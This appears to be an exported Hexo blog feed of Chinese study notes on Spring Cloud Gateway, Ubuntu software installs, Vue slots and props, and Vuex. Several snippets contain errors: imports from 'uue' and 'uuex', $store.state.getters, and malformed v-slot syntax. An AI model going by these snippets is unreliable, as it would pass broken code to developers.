&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;druid&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;druid.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;mybatis.spring.boot.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;junit.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;log4j&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;log4j&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;log4j.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;$&#123;lombok.version&#125;&lt;/version&gt;</span><br><span class="line">                &lt;optional&gt;<span class="literal">true</span>&lt;/optional&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">        &lt;/dependencies&gt;</span><br><span class="line">    &lt;/dependencyManagement&gt;</span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;sourceDirectory&gt;src/main/kotlin&lt;/sourceDirectory&gt;</span><br><span class="line">        &lt;testSourceDirectory&gt;src/test/kotlin&lt;/testSourceDirectory&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;kotlin-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;<span class="number">1.9</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">                &lt;executions&gt;</span><br><span class="line">                    &lt;execution&gt;</span><br><span class="line">                        &lt;id&gt;compile&lt;/id&gt;</span><br><span class="line">                        &lt;phase&gt;compile&lt;/phase&gt;</span><br><span class="line">                        &lt;goals&gt;</span><br><span class="line">                            &lt;goal&gt;compile&lt;/goal&gt;</span><br><span class="line">                        &lt;/goals&gt;</span><br><span class="line">                    &lt;/execution&gt;</span><br><span class="line">                    &lt;execution&gt;</span><br><span class="line">                        &lt;id&gt;test-compile&lt;/id&gt;</span><br><span class="line">                        &lt;phase&gt;test-compile&lt;/phase&gt;</span><br><span class="line">                        &lt;goals&gt;</span><br><span class="line">                            &lt;goal&gt;test-compile&lt;/goal&gt;</span><br><span class="line">                        &lt;/goals&gt;</span><br><span class="line">                    &lt;/execution&gt;</span><br><span class="line">                &lt;/executions&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;<span class="number">2.22</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-failsafe-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;<span class="number">2.22</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>Springcloud(6)</title>
    <url>/posts/b7b7a991/</url>
    <content><![CDATA[<h1 id="路由网关"><a href="#路由网关" class="headerlink" title="路由网关"></a>路由网关</h1><h2 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h2><blockquote>
<p>动嘴，理论。动手，架构</p>
</blockquote>
<p>SpringCloud Gateway使用的Webflux中的reactor-netty响应式编程组件，底层使用了netty通讯框架。基于NIO（异步非阻塞模型）</p>
<blockquote>
<p>传统框架：structs2，springmvc都是基于servlet API和Servlet容器。也就是阻塞框架，而Servlet3.1后就有了异步非阻塞的支持，WebFlux就是一个典型非阻塞异步的框架。他的核心基于Reactor</p>
</blockquote>
<p><strong>3大核心：路由，断言，过滤</strong></p>
<p><img src="https://image.zfxt.top/hexo-blog/Springcloud(6)-2023-11-05-07-11.png"></p>
<h3 id="静态配置"><a href="#静态配置" class="headerlink" title="静态配置"></a>静态配置</h3><p>有两种方式：1，修改yml文件</p>
<ol>
<li>建module</li>
<li>修改pom<br>需要导入一些新的内容包：</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>top.zfxt.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>修改yml<br>他主要就是eureka配置即可<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-gateway</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">cloud-gateway-service</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka</span></span><br></pre></td></tr></table></figure></li>
<li>路由网关配置<br>在application.yml中设置如下<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh</span> <span class="comment">#payment_route #路由的ID,没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">http://localhost:8001</span> <span class="comment">#匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/get/**</span> <span class="comment">#断言，路径相匹配的进行路由</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh2</span> <span class="comment">#payment route #路由的ID,没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">http://localhost:8001</span> <span class="comment">#匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">predicates:</span>  <span class="comment">#断言，路径相匹配的进行路由</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/lb/**</span></span><br></pre></td></tr></table></figure>
完成配置后，即可通过9527这个端口访问服务</li>
</ol>
<p>第二种方式，添加一个配置项</p>
<p>在代码中注入<code>RouteLocator</code>的<code>Bean</code></p>
<ol>
<li>构建config类<br><img src="https://image.zfxt.top/hexo-blog/Springcloud(6)-2023-11-03-57-30.png"><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">GatewayConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">customRoutelocator</span><span class="params">(routeLocatorBuilder:<span class="type">RouteLocatorBuilder</span>)</span></span>: RouteLocator? &#123;</span><br><span class="line">        <span class="keyword">val</span> routes = routeLocatorBuilder.routes()</span><br><span class="line">        routes.route(<span class="string">&quot;path_route_baidu&quot;</span>)&#123;</span><br><span class="line">            it.path(<span class="string">&quot;/guonei&quot;</span>).uri(<span class="string">&quot;https://news.baidu.com/guonei&quot;</span>)</span><br><span class="line">        &#125;.build()</span><br><span class="line">        <span class="keyword">return</span> routes.build()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="动态配置"><a href="#动态配置" class="headerlink" title="动态配置"></a>动态配置</h3><p>允许利用注册中心动态创建路由</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">locator:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span> <span class="comment"># 允许利用注册中心动态创建路由</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh</span> <span class="comment">#payment_route #路由的ID,没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line"><span class="comment">#          uri: http://localhost:8001 #匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://CLOUD-PAYMENT-SERVICE</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/get/**</span> <span class="comment">#断言，路径相匹配的进行路由</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh2</span> <span class="comment">#payment route #路由的ID,没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line"><span class="comment">#          uri: http://localhost:8001 #匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://CLOUD-PAYMENT-SERVICE</span></span><br><span class="line">          <span class="attr">predicates:</span>  <span class="comment">#断言，路径相匹配的进行路由</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/lb/**</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="predicates"><a href="#predicates" class="headerlink" title="predicates"></a>predicates</h4><p><img src="https://image.zfxt.top/hexo-blog/Springcloud(6)-2023-11-08-00-33.png"><br>根据这个图示，可以分辨出他具有那些可选的配置项，包括Path等</p>
<h4 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h4><p>路由过滤器可用于修改进入的HTTP请求和返回的HTTP响应，路由过滤器只能指定路由进行使用。<br>自定义过滤器：需要实现两个接口。GlobalFilter，Ordered</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> log: InfoLog = Log.<span class="keyword">get</span>(InfoLog::<span class="keyword">class</span>.java)</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">MyLogGlobalFilter</span> : <span class="type">GlobalFilter</span>, <span class="type">Ordered</span> &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">filter</span><span class="params">(exchange: <span class="type">ServerWebExchange</span>?, chain: <span class="type">GatewayFilterChain</span>?)</span></span>: Mono&lt;<span class="built_in">Void</span>&gt; &#123;</span><br><span class="line">        log.info(<span class="string">&quot;*****************come in MyLogGlobalFilter*********************&quot;</span>)</span><br><span class="line">        <span class="keyword">val</span> name = exchange?.request?.queryParams?.getFirst(<span class="string">&quot;uname&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;**********用户名为非法null&quot;</span>)</span><br><span class="line">            exchange!!.response.statusCode = HttpStatus.NOT_ACCEPTABLE</span><br><span class="line">            <span class="keyword">return</span> exchange.response.setComplete()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> chain!!.filter(exchange)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//用来设置优先级,数据越小，优先级越高</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">getOrder</span><span class="params">()</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu上轻松安装Nginx</title>
    <url>/posts/3e159b7d/</url>
    <content><![CDATA[<p>在ubuntu下按照nginx，只需要使用简单的命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt install nginx</span><br></pre></td></tr></table></figure>
<ul>
<li>nginx的配置目录都在<code>/etc/nginx</code>下。</li>
<li>主要的 Nginx 配置文件是<code>/etc/nginx/nginx.conf</code>。</li>
</ul>
]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu使用微信</title>
    <url>/posts/e7799ecb/</url>
    <content><![CDATA[<p>最佳方法就是使用优麒麟等一些国内linux平台封装好的微信，如该</p>
<p><a href="https://www.ubuntukylin.com/applications/106-cn.html">微信</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行如下命令完成安装</span></span><br><span class="line">wget http://archive.ubuntukylin.com/software/pool/partner/weixin_2.1.1_amd64.deb</span><br><span class="line">dpkg -i weixin_2.1.1_amd64.deb</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>ubuntu桌面端</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue 插槽：具名和作用域</title>
    <url>/posts/1c72751d/</url>
    <content><![CDATA[<h2 id="具名插槽"><a href="#具名插槽" class="headerlink" title="具名插槽"></a>具名插槽</h2><p>就是可以在组件中，可以定义插槽的名字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;slot name=&quot;haha&quot;&gt;&lt;/slot&gt;</span><br></pre></td></tr></table></figure>
<p>然后可以在调用该组件的父组件中通过<code>&lt;template v-slot=&quot;haha&quot;&gt;...&lt;/template&gt;</code>来插入新的结构标签到组件中。</p>
<h2 id="作用域插槽。"><a href="#作用域插槽。" class="headerlink" title="作用域插槽。"></a>作用域插槽。</h2><p>他的最大特点是可以从子组件传递数据到父组件。通过<code>:</code>标记，和prop类似，将具体的对象发送到父组件中使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//子组件</span><br><span class="line">&lt;slot name=&quot;haha&quot; :games=&quot;games&quot;  :msg=&quot;msg&quot;&gt;&lt;/slot&gt;</span><br><span class="line">//父组件</span><br><span class="line">//这里的test是可以任意取名的。他会将子组件传递过来的所有值全部接受，然后你看也获取其中的对象</span><br><span class="line">&lt;template v-slot=&quot;haha&quot; scope =&quot;test&quot;&gt;</span><br><span class="line">&lt;ul v-for=&quot;(game,index) in test.games&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">    &lt;li v-model = &quot;game.id&quot;&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">//也可以直接使用插槽语法（es6）</span><br><span class="line">&lt;template v-slot=&quot;haha&quot; scope =&quot;&#123;games&#125;&quot;&gt;</span><br><span class="line">//这里的test是可以任意取名的。他会将子组件传递过来的所有值全部接受，然后你看也获取其中的对象</span><br><span class="line">&lt;ul v-for=&quot;(game,index) in games&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">    &lt;li v-model = &quot;game.id&quot;&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>
<h1 id="vue更新了新语法。"><a href="#vue更新了新语法。" class="headerlink" title="vue更新了新语法。"></a>vue更新了新语法。</h1><p>对于具名插槽和作用域插槽都用更新的使用。<br>都通过v-slot:”插槽名”&#x3D;”{参数名称}”<br>例如:v&#x3D;slot:haha&#x3D;”{games}”</p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu修改鼠标样式</title>
    <url>/posts/9c36dbd9/</url>
    <content><![CDATA[<ol>
<li>首先打开<strong>优化</strong>设置</li>
</ol>
<p><img src="https://image.zfxt.top/hexo-blog/Ubuntu%E4%BF%AE%E6%94%B9%E9%BC%A0%E6%A0%87%E6%A0%B7%E5%BC%8F-2024-02-23-06-11.png"></p>
<p>可以看到这里是可以修改鼠标样式的，而我们的鼠标图标都是保存在<code>/usr/share/icons</code>中的，因此我们可以将我们想添加的鼠标图标放进去，即可完成添加。这里可供参考的有</p>
<p><a href="https://linux.cn/article-15998-1.html">分享|Linux 桌面的十个最佳光标主题</a></p>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>鼠标样式</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue 代理服务器配置新增建议</title>
    <url>/posts/3afb44a6/</url>
    <content><![CDATA[<p>关于配置vue的代理服务器新增两点建议</p>
<ol>
<li>普通的http或者https请求。<br>满足在<code>vue.config.js</code>配置一个普通的代理然后在使用该代理时可以不用写全完整的uri。而只用写具体的访问地址<br>如下<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">devServer</span>:&#123;</span><br><span class="line">    <span class="attr">proxy</span>:&#123;</span><br><span class="line">      <span class="string">&#x27;/api/&#x27;</span>:&#123;</span><br><span class="line">        <span class="attr">target</span>:<span class="string">&#x27;http://localhost:9090/&#x27;</span>,</span><br><span class="line">        <span class="attr">pathRewrite</span>:&#123;<span class="string">&#x27;^/api&#x27;</span>:<span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">        <span class="attr">ws</span>:<span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
通过axios向后端发送请求时<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="title function_">axios</span>(&#123;</span><br><span class="line">          <span class="attr">url</span>:<span class="string">&#x27;/api/login&#x27;</span>,</span><br><span class="line">          <span class="attr">method</span>:<span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">          <span class="attr">params</span>:&#123;</span><br><span class="line">            <span class="attr">username</span>:<span class="variable language_">this</span>.<span class="property">username</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;).<span class="property">then</span></span><br></pre></td></tr></table></figure>
只写具体的请求路径即可完成代理的转发。</li>
<li>通过WebSocket来完成转发时<br>首先，他的代理必须打开ws，也就是将http协议升级为ws协议<br>也是在<code>vue.config.js</code>中配置<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">devServer</span>:&#123;</span><br><span class="line">    <span class="attr">proxy</span>:&#123;</span><br><span class="line">      <span class="string">&#x27;/ws/&#x27;</span>:&#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;ws://localhost:9090/&#x27;</span>,</span><br><span class="line">        <span class="attr">pathRewrite</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;^/ws/&#x27;</span>: <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">ws</span>: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
此时与访问http请求不同的是，他在具体环节向后端发送ws链接请求时，必须把完整的访问地址写全，否则他将会被导向到http代理<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">socket</span> = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://&quot;</span>+<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">host</span> +<span class="string">&quot;/ws/chat/&quot;</span> + <span class="variable language_">this</span>.<span class="property">username</span>)</span><br></pre></td></tr></table></figure>
如上。</li>
</ol>
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>WebSocket</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue 父子组件参数传递：props</title>
    <url>/posts/e0b24930/</url>
    <content><![CDATA[<p>父组件向子组件传递参数时，可以使用props</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">props</span>: [<span class="string">&#x27;foo&#x27;</span>],</span><br><span class="line">  <span class="title function_">created</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// props 会暴露到 `this` 上</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">foo</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>除了直接使用字符串的形式，也可以使用对象的形式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">likes</span>: <span class="title class_">Number</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>props</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue 插槽：复用组件的定制内容</title>
    <url>/posts/ec55e168/</url>
    <content><![CDATA[<h2 id="默认插槽slot"><a href="#默认插槽slot" class="headerlink" title="默认插槽slot"></a>默认插槽slot</h2><p>一般出现情况，当你要复用一个组件时，但是这个组件中你复用的只有他的框架，他的所有内容你都需要根据具体内容再次修改。<br>而如果你在组件中添加v-show来实现上述要求时，会让结构变得非常混乱，无法正常阅读源码。因此最好的方法是每个组件再单独提供一些html结构和样式。<br><em><strong>所以vue提供了一个方法，插槽：</strong></em><br>在组件中需要使用<slot>当你没有向我传递值时，我会展示到页面上</slot>来表示哪里需要插入新的结构。<br>然后在引用该组件的地方写好插槽的内容。<br>例如：Student是组件，在app中 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;Student&gt;</span><br><span class="line">        &lt;img src=&quot;&quot;&gt;</span><br><span class="line">    &lt;/Student&gt;</span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>这样子，在Student的slot标签处，就会被插入img标签</p>
<h2 id="具名插槽"><a href="#具名插槽" class="headerlink" title="具名插槽"></a>具名插槽</h2><p>可以给每个插槽命名，通过不同的插槽，插入到不同的位置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;slot name=&quot;center&quot;&gt;我是命名为center的插槽&lt;/slot&gt;</span><br><span class="line">&lt;slot name=&quot;foot&quot;&gt;我是命名为foot的插槽&lt;/slot&gt;</span><br></pre></td></tr></table></figure>
<p>需要具体放在哪个插槽里，需要在标签添加属性slot&#x3D;”center”会放到slot的插槽里。<br>例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 像下面一样 --&gt;</span><br><span class="line">&lt;div slot=&quot;center&quot;id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;Student&gt;</span><br><span class="line">      &lt;img src=&quot;&quot;&gt;</span><br><span class="line">  &lt;/Student&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuex Getters 使用指南</title>
    <url>/posts/41f76cd3/</url>
    <content><![CDATA[<h1 id="vuex"><a href="#vuex" class="headerlink" title="vuex"></a>vuex</h1><p>正式使用方法。</p>
<h3 id="getters"><a href="#getters" class="headerlink" title="getters"></a>getters</h3><p>在store&#x2F;index.js中添加一个</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getters = &#123;</span><br><span class="line">    <span class="title function_">bigSum</span>(<span class="params">state</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> state.<span class="property">sum</span>*<span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">然后再<span class="keyword">export</span>中添加getters</span><br></pre></td></tr></table></figure>
<p>再组件中要调用getters，使用$store.state.getters.内容</p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuex 数据管理详解</title>
    <url>/posts/cb1dda86/</url>
    <content><![CDATA[<p>#vuex<br><img src="https://memos.zfxt.top/o/r/43/32effdf9-4315-4e39-a21e-535893ec398e/1682486853_image.png" alt="image"><br>这是vuex的工作原理图。</p>
<h3 id="vue2使用vuex3，vue3使用vuex4"><a href="#vue2使用vuex3，vue3使用vuex4" class="headerlink" title="vue2使用vuex3，vue3使用vuex4."></a>vue2使用vuex3，vue3使用vuex4.</h3><p>vuex其实是存储在store中。也就是actions，mutations，state都是在store中的。<br>主要流程。</p>
<ol>
<li>安装vuex<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//vue2中需要使用vuex3</span><br><span class="line">npm i  vuex@3</span><br></pre></td></tr></table></figure>
然后再src目录下，新建一个store目录，然后再store目录下新建一个index.js。<br>其中写以下模板内容。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  <span class="string">&#x27;Vue&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;uue&#x27;</span></span><br><span class="line"><span class="keyword">import</span>   <span class="string">&#x27;Vuex&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;uuex&#x27;</span></span><br><span class="line"><span class="comment">//再编译Vuex前必须先通过Vue使用Vuex。然后他会自动检测到Vuex的内容。并绑定到Vue的内部。</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"><span class="keyword">const</span> actions = &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> mutations =&#123;&#125;</span><br><span class="line"><span class="keyword">const</span> state = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  actions,</span><br><span class="line">  mutations,</span><br><span class="line">  state,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure></li>
</ol>
<p>然后再main.js中直接引入store 既可以让所有的vc，vm都能够访问到Vuex</p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuex中的关键功能：Actions、Mutations、State</title>
    <url>/posts/518b3934/</url>
    <content><![CDATA[<h1 id="vuex"><a href="#vuex" class="headerlink" title="vuex"></a>vuex</h1><p>再vuex中，有三个关键的内容和相关的函数方法</p>
